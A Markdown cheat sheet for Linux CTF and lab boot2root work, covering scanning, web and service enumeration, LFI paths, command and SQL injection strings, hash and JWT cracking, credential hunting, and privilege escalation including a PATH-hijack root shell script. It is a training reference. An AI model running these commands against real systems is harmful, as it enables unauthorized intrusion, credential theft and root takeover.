# Linux Attack Path Cheat Sheet

Generic Linux boot2root checklist for authorized labs and CTF environments.

Extra local reference: [Local Linux Enumeration & Privilege Escalation](../references/Local%20Linux%20Enumeration%20%26%20Privilege%20Escalation.md)

OSCP module source map: [OSCP Module Map](../references/OSCP%20Module%20Map.md#linux-module).

Related alternatives:

- [Service Enumeration Alternatives](../tools/Service%20Enumeration%20Alternatives.md)
- [Web Attack Alternatives](../tools/Web%20Attack%20Alternatives.md)
- [Cloud and Misc Recon Alternatives](../tools/Cloud%20and%20Misc%20Recon%20Alternatives.md)

## Core Flow

1. Discover target and ports.
2. Enumerate every exposed service.
3. Find credentials, file reads, uploads, command injection, source leaks, or known CVEs.
4. Get a shell or SSH session.
5. Stabilize shell and enumerate locally.
6. Move laterally if needed.
7. Escalate through sudo, SUID, capabilities, cron, writable files, containers, credentials, or kernel issues.

## Recon

- `nmap -sn 192.168.100.0/24`
- `nmap -p- --min-rate 5000 -oN ports.txt ip`
- `nmap -sC -sV -O -p PORTS -oN nmap.txt ip`
- `nmap -sU --top-ports 100 -oN udp.txt ip`
- `curl -i http://ip:port/`
- `nc -nv ip port`
- `openssl s_client -connect ip:port`

## Web Enumeration

- `whatweb http://ip/`
- `curl -i http://ip/`
- `curl -s http://ip/robots.txt`
- `gobuster dir -u http://ip/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,txt,html,bak,zip`
- `feroxbuster -u http://ip/ -x php,txt,html,bak,zip`
- `ffuf -u http://ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
- `ffuf -u 'http://ip/page.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`

Check for:

- HTML comments, cookies, headers, and JavaScript secrets
- `robots.txt`, backups, `.git/`, source archives, hidden directories
- upload forms, admin panels, API routes, JWTs
- encoded strings: Base64, hex, ROT13, Base85, Morse, Atbash
- virtual hosts

Virtual host fuzzing:

```bash
ffuf -u http://ip/ -H "Host: FUZZ.domain.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs SIZE
```

## Common Web Footholds

### LFI / Path Traversal

Try parameters like `file`, `page`, `doc`, `path`, `template`, `display_page`.

- `../../../../etc/passwd`
- `/etc/passwd`
- `/home/user/.ssh/id_rsa`
- `/var/www/html/index.php`
- `/proc/self/environ`
- `/var/log/apache2/access.log`
- `/var/log/nginx/access.log`
- `/var/log/vsftpd.log`

Use LFI to read users, SSH keys, app source, DB credentials, and logs.

### LFI To RCE

General lab pattern:

1. Confirm the log file is readable through LFI.
2. Send a request with a server-side code snippet in a logged field such as User-Agent.
3. Include the poisoned log through the vulnerable parameter.
4. Pass a harmless command first, such as `id`, before trying shell access.

Avoid storing live one-line payloads in this note; keep payloads in your disposable lab scratchpad.

### Command Injection

Try separators and substitutions with a harmless command first:

- `; id`
- `| id`
- backtick command substitution
- `$()` command substitution
- `${IFS}` when spaces are filtered

Common places: ping, traceroute, nmap panels, image tools, translation tools, compilers, chat commands, and custom shells.

After proving execution, use your lab-approved reverse shell generator or payload repository instead of pasting static payloads here.

### Upload To RCE

- PHP/ASPX/JSP shell depending on stack
- extensions: `.php`, `.phtml`, `.php5`
- image polyglot technique when content checks are weak
- check metadata processors such as ExifTool/ImageMagick
- check filename injection if the backend shells out to tools

### SQL Injection

- `'`
- `' or 1=1-- -`
- `' OR SLEEP(5)-- -`
- `sqlmap -u 'http://ip/item.php?id=1' --batch --dbs`
- `sqlmap -u 'http://ip/login.php' --data 'user=a&pass=a' --batch --dump`

For JSON requests with blocked bad characters, save the request and use tamper scripts:

```bash
sqlmap -r req.request --tamper=charunicodeescape --level 5 --risk 3 --batch
```

Look for reused SSH credentials, admin hashes, plaintext passwords, and app config secrets.

### JWT

- Decode token.
- Crack weak HMAC secrets.
- Forge `admin` / elevated role.

```bash
john jwt.txt --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 16500 jwt.txt rockyou.txt
```

### XXE

Use a lab XXE template to read a harmless file first, then target configs/keys only when authorized.

Common target files:

- `/etc/passwd`
- application config files
- SSH keys
- internal service metadata

## Service Checks

### SSH

- `ssh user@ip`
- `ssh -i id_rsa user@ip`
- `chmod 600 id_rsa`
- `ssh2john id_rsa > ssh.hash`
- `john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt`

### FTP

- `ftp ip`
- try `anonymous:anonymous`
- `wget -m ftp://anonymous:anonymous@ip/`
- `hydra -l user -P rockyou.txt ftp://ip`

Look for archives, notes, scripts, upload permissions, and log poisoning.

### SMB / Samba

- `smbclient -L //ip/ -N`
- `smbclient //ip/share -N`
- `enum4linux-ng -A ip`
- `crackmapexec smb ip -u '' -p '' --shares`

Treat Samba fingerprints like `Windows 6.1 (Samba ... Debian)` as Linux until shell evidence proves otherwise.

### NFS

- `showmount -e ip`
- `sudo mount -t nfs -o vers=3,nolock ip:/share ./target-NFS`
- `sudo umount ./target-NFS`

Check `no_root_squash`, UID/GID mismatches, backups, SSH keys, and writable web roots.

### SNMP

- `snmpwalk -v2c -c public ip`
- `onesixtyone -c community-strings.list ip`
- `braa public@ip:.1.*`

Look for process lists, usernames, services, network interfaces, and installed software.

### TFTP

- `tftp ip`
- `get filename`

Try likely files in labs: `id_rsa`, `config`, `backup`, `startup-config`, `flag.txt`.

### Databases

MySQL/MariaDB:

```sql
show databases;
use db;
show tables;
select * from table;
```

Redis:

- `redis-cli -h ip`
- `INFO`
- `KEYS *`

Memcached:

- `nc ip 11211`
- `stats items`
- `stats cachedump SLAB 0`
- `get key`

## File And Crypto Clues

- `file item`
- `strings item`
- `exiftool image.jpg`
- `binwalk -e file`
- `steghide info image.jpg`
- `steghide extract -sf image.jpg`
- `zip2john file.zip > zip.hash`
- `rar2john file.rar > rar.hash`
- `7z2john file.7z > 7z.hash`
- `john hash --wordlist=/usr/share/wordlists/rockyou.txt`

Check Base64, hex, ROT13, Base85, Morse, Atbash, QR codes, DTMF audio, LUKS containers, and pixelated images.

LUKS:

```bash
file blob
cryptsetup luksDump blob
bruteforce-luks -f rockyou.txt blob
sudo cryptsetup luksOpen blob opened
sudo mount /dev/mapper/opened /mnt/opened
```

## Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 cols 120
```

After `Ctrl+Z` on attacker terminal:

```bash
stty raw -echo; fg
```

## Local Enumeration

```bash
id
whoami
hostname
uname -a
sudo -l
cat /etc/passwd
ls -la /home
ps auxww
ss -tulpn
find / -perm -4000 -type f -ls 2>/dev/null
getcap -r / 2>/dev/null
find / -writable -type d 2>/dev/null | grep -vE '/proc|/sys|/dev'
cat /etc/crontab
ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null
```

Credential hunting:

```bash
grep -RniE 'pass|password|pwd|secret|token|key' /var/www /opt /home 2>/dev/null
find / -name id_rsa -o -name authorized_keys 2>/dev/null
cat ~/.bash_history
ls -la /var/mail /var/spool/mail 2>/dev/null
```

## Privilege Escalation Patterns

### Sudo NOPASSWD

Run `sudo -l`, then check allowed binaries against GTFOBins. Look for commands that open pagers, load configs/plugins, write files, read arbitrary files, or execute child commands.

Examples:

- `nano` -> edit sudoers
- `tee` -> write sudoers file
- `nmap` -> NSE script execution path
- `exiftool` -> config inheritance
- `systemctl status` -> pager escape when available
- `ssh-keygen -D` -> shared library loading path

### PATH Hijacking

If a sudo script calls binaries without absolute paths:

1. Create a writable directory.
2. Place a fake binary with the expected name.
3. Prepend that directory to `PATH` during the sudo call if permitted.
4. Use the root context to create a controlled privilege escalation path.

Quick triage:

```bash
echo $PATH
which cat
strings ./suspect-binary | grep -E 'cat|cp|tar|sh|bash|python|find'
grep -R "system(" -n . 2>/dev/null
```

Lab proof pattern:

```bash
mkdir -p /tmp/pathlab
printf '#!/bin/sh\nid > /tmp/pathlab.proof\n/bin/bash -p\n' > /tmp/pathlab/cat
chmod +x /tmp/pathlab/cat
PATH=/tmp/pathlab:$PATH ./suspect-binary
```

This only works when the privileged process calls `cat` without an absolute path and preserves or accepts the attacker-controlled `PATH`.

### Cron Abuse

If root cron runs a writable script or writable temp file, replace the writable component with a lab-approved command that proves root execution, then convert to a shell path.

Also check cron jobs that call package managers or relative commands. Sec-Fortress examples included root cron running `apt-get update` and cron scripts where a writable PATH location could hijack a command.

### SUID

Find unusual SUID binaries and compare with GTFOBins:

- `screen`, `sulogin`, `bash`, `find`, `cp`, `tar`, `nmap`, `python`, `node`, `csh`, custom binaries

### Capabilities

Dangerous:

- `cap_setuid+ep`
- `cap_dac_read_search+ep`
- `cap_dac_override+ep`

Common abuse ideas:

- `cap_setuid` on interpreters can become UID 0.
- `cap_dac_read_search` on archivers/readers can expose root-owned files.
- read `/etc/shadow`, root SSH keys, or protected app configs only in authorized labs.

### Writable `/etc/passwd`

If writable, add a new UID 0 account with a known password hash instead of breaking the existing root account.

### Readable `/etc/shadow`

```bash
unshadow /etc/passwd shadow.txt > hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
su root
```

Disk group:

```bash
debugfs /dev/sda1
debugfs: cat /etc/shadow
```

### Python Library Hijacking

If sudo runs a Python script and import paths are writable:

1. Identify imported module names.
2. Place a controlled module earlier in `sys.path`.
3. Trigger the sudo script.
4. Use the elevated code path to prove execution, then escalate.

### Docker

```bash
cat /proc/1/cgroup
ls -la /.dockerenv
ls -la /var/run/docker.sock
```

If docker socket is writable, mount the host filesystem inside a disposable container and inspect from there.

### AppArmor / Sandboxes

If a shell feels restricted:

- `aa-status`
- `cat /proc/self/attr/current`
- inspect writable paths
- search for allowed interpreters or profile escape paths

### ICMP / Packet Clues

If hints mention ping, packets, or listening:

- `sudo tcpdump -i tun0 icmp -A`
- `sudo tcpdump -i tun0 -w capture.pcap`

Inspect payloads in Wireshark for credentials, commands, or file fragments.

### Port Knocking

If all useful ports are closed but hints suggest sequence:

- `knock ip port1 port2 port3`
- rescan with `nmap -p- ip`

## Flag Hunting

```bash
find / -iname '*user*txt' -o -iname '*root*txt' 2>/dev/null
find / -name 'flag*' 2>/dev/null
```

Check non-standard locations like `/var/opt`, hidden directories, encoded content, and unusual filenames.
